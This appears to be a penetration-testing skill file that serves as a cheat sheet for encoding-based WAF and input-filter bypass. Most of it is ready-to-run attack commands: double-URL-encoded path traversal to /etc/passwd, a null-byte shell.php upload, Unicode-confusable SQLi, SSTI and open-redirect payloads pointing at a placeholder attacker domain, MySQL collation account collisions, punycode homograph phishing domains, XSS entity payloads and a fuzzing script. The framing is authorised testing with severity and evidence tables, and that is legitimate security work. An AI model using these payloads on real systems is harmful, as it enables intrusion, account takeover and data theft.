---
name: attack-encoding-bypass
description: "Encoding & Transformation bypass cheat sheet — double/mixed URL encoding, Unicode normalization abuse, punycode homographs, HTML entities, and nested Base64 to defeat WAFs and input filters"
category: "web-application"
version: "1.0"
author: "cyberstrike-official"
tags:
  - encoding
  - waf-bypass
  - unicode
  - filter-evasion
  - attack
tech_stack:
  - web
  - waf
cwe_ids:
  - CWE-172
  - CWE-116
  - CWE-838
chains_with:
  - attack-ssrf
  - attack-xxe
  - wstg-inpv-01
prerequisites: []
severity_boost:
  attack-ssrf: "Encoding bypass defeats SSRF IP/URL filters — combine to reach blocked internal hosts or metadata endpoints"
  attack-xxe: "Encoding bypass smuggles blocked XML entity/DOCTYPE keywords past naive XXE filters"
  wstg-inpv-01: "Use as the filter-evasion layer for any WSTG-INPV-01 reflected/stored injection test that gets blocked by a WAF"
---

# Encoding & Transformation Bypass

## Objective

Use encoding, normalization, and representation tricks (URL encoding layers, Unicode normalization/confusables, punycode, HTML entities, nested Base64) to smuggle payloads for SQLi/XSS/SSRF/path traversal/auth-bypass past input filters and WAFs that only pattern-match the decoded/canonical form once.

## Testing Methodology

### Phase 1: Double / Mixed URL Encoding

```bash
# Single-decode WAFs miss a second encoding layer. '/'->%2F->%252F, etc.
curl -s "https://TARGET/api/file?path=%252e%252e%252fetc%252fpasswd"
curl -s "https://TARGET/search?q=%253Cscript%253Ealert(1)%253C%252Fscript%253E"

# Mixed-case hex and overlong encoding
curl -s "https://TARGET/api?q=%3Cscript%3E" 
curl -s "https://TARGET/api?q=%3cscript%3e"

# Null-byte / overlong UTF-8 to truncate filter parsing (legacy stacks)
curl -s "https://TARGET/file?name=shell.php%00.jpg"
curl -s "https://TARGET/api?id=1%c0%80OR%c0%801=1"
```

### Phase 2: Unicode Normalization Abuse (NFKC/NFKD Collapse)

```bash
# Fullwidth / lookalike characters that normalize back to blocked ASCII server-side
# even though the raw string doesn't match the filter's blocklist
curl -s "https://TARGET/api/read?path=‥/‥/‥/etc/passwd"        # U+2025 -> ../../../etc/passwd
curl -s "https://TARGET/api/read?path=︰/︰/︰/etc/passwd"      # U+FE30 -> ../../../etc/passwd
curl -s "https://TARGET/search?q=＇%20or%20＇1＇=＇1"            # U+FF07 -> ' or '1'='1
curl -s "https://TARGET/search?q=admin'﹣﹣"                       # U+FE63 -> admin'--
curl -s "https://TARGET/preview?url=domain。com"                  # U+3002 -> domain.com
curl -s "https://TARGET/redirect?to=／／ATTACKER.DOMAIN.TLD"      # U+FF0F -> //ATTACKER.DOMAIN.TLD
curl -s "https://TARGET/comment?c=＜img%20src=a＞"                # U+FF1C/FF1E -> <img src=a>
curl -s "https://TARGET/template?t=﹛﹛3+3﹜﹜"                   # U+FE5B -> {{3+3}} (SSTI)
curl -s "https://TARGET/upload?name=shell.ｐʰｐ"                  # fullwidth p + modifier h -> shell.php

python3 -c "
import unicodedata
s = 'ａdmin'  # fullwidth a
print(unicodedata.normalize('NFKC', s))   # -> 'admin'
"
```

### Phase 3: Unicode Case-Folding / Collation Auth Bypass (MySQL)

```sql
-- utf8mb4_0900_ai_ci (accent/case-insensitive, default in many MySQL 8 setups)
-- treats confusable characters as EQUAL — abusable in login/reset/OAuth email match
SELECT 'admin' = 'ᵃdmin';   -- returns 1 under _ai_ci collation

-- Confirm the app's comparison collation before relying on this:
SELECT 'a' = 'ᵃ' COLLATE utf8mb4_0900_as_cs;  -- 0 = strict, safe
SELECT 'a' = 'ᵃ';                              -- 1 = exploitable if default collation is lax
```

```bash
# Registration/login collision using confusable characters
curl -s -X POST "https://TARGET/register" -d "email=admin%E1%B5%83@target.com&password=Passw0rd!"
```

### Phase 4: Punycode Homograph Domains

```bash
# IDN homograph for phishing/open-redirect/SSRF allowlist bypass
# раypal.com (Cyrillic а/р) encodes to:
curl -s "https://TARGET/redirect?url=https://xn--ypal-43d9g.com/"

# Convert any target domain to test punycode representation
python3 -c "print('раypal.com'.encode('idna').decode())"
```

### Phase 5: HTML Entity Encoding for XSS Filter Evasion

```html
<!-- Decimal / hex / mixed-case entity encoding, no whitespace between entity and ; -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
<a href="javascript&colon;alert(1)">click</a>
<svg onload=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>

<!-- Entity without trailing semicolon (many browsers still parse it) -->
<img src=x onerror=alert&#40;1&#41;>
```

### Phase 6: Nested / Chunked Base64

```bash
# Filters that only check for one decode pass miss nested encoding in params
# that the app itself double-decodes (e.g. base64-in-base64 config/token fields)
echo -n '<script>alert(1)</script>' | base64
# PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
echo -n 'PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==' | base64
# UEhOamNtbHdkRDVoYkdWeWRDZ3hLVHd2YzJOeWNtbHdkRDQ9

curl -s -X POST "https://TARGET/api/import" \
  --data '{"payload":"UEhOamNtbHdkRDVoYkdWeWRDZ3hLVHd2YzJOeWNtbHdkRDQ9"}'

# Base64 inside a URL-encoded param inside a JSON body (three encoding layers)
curl -s "https://TARGET/api?data=%50%48%4e%6a%63%6d%6c%77%64%44%35%68%62%47%56%79%64%43%67%78%4b%54%77%76%63%32%4e%79%63%6d%6c%77%64%44%34%3d"
```

### Phase 7: Combine Layers to Beat a Live WAF

```bash
# Stack techniques: URL-encode the Unicode confusable payload, then send with
# an alternate Content-Type to dodge signature matching on the raw body
curl -s -X POST "https://TARGET/api/search" \
  -H "Content-Type: application/x-www-form-urlencoded; charset=utf-16" \
  --data "q=%EF%BC%9Cscript%EF%BC%9Ealert(1)%EF%BC%9C/script%EF%BC%9E"

# Automate a quick fuzz across encoding variants for a single payload
python3 - <<'EOF'
import urllib.parse, base64, requests
payload = "<script>alert(1)</script>"
variants = {
    "raw": payload,
    "url1": urllib.parse.quote(payload),
    "url2": urllib.parse.quote(urllib.parse.quote(payload)),
    "b64": base64.b64encode(payload.encode()).decode(),
    "html_dec": ''.join(f'&#{ord(c)};' for c in payload),
}
for name, v in variants.items():
    r = requests.get("https://TARGET/search", params={"q": v}, timeout=10)
    print(name, r.status_code, len(r.text))
EOF
```

## What Constitutes a Finding

| Finding | Severity |
|---|---|
| Encoding bypass results in confirmed XSS/SQLi/SSRF/RCE past a filter or WAF | Critical (P1) / High (P2) (per underlying vuln class) |
| Unicode normalization enables authentication bypass or account collision | High (P2) |
| WAF/filter is bypassed but underlying sink is not independently exploitable | Medium (P3) |
| Punycode homograph accepted in redirect/allowlist without IDN warning | Medium (P3) |
| Filter normalizes/decodes correctly, bypass fails | Informational |

## Evidence Requirements

- Raw (pre-encoding) and wire-format (post-encoding) payload side by side
- Proof the WAF/filter blocked the plain payload and accepted the encoded variant (two requests, two responses)
- Confirmation of the resulting impact (XSS execution screenshot, SQLi data extraction, SSRF callback, auth bypass session)
- Collation/normalization mode identified (e.g. MySQL `utf8mb4_0900_ai_ci`) when relevant

## Tools

- `curl` / Burp Repeater with encoding tabs — manual layer-by-layer testing
- `python3` (`urllib.parse`, `unicodedata`, `base64`) — payload transformation scripting
- [Unicode Pentester Cheatsheet](https://gosecure.github.io/unicode-pentester-cheatsheet/) — confusable character lookup
- Burp `Decoder` — quick multi-layer encode/decode verification

## References

- [PayloadsAllTheThings: Encoding and Transformations](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Encoding%20Transformations)
- [WAF Bypassing with Unicode Compatibility - Jorge Lajara](https://jlajara.gitlab.io/Bypass_WAF_Unicode)
- [Unicode Normalization Vulnerabilities & the Special K Polyglot - AppCheck](https://web.archive.org/web/20190916002602/https://appcheck-ng.com/unicode-normalization-vulnerabilities-the-special-k-polyglot/)
- [Puny-Code, 0-Click Account Takeover - Voorivex](https://blog.voorivex.team/puny-code-0-click-account-takeover)
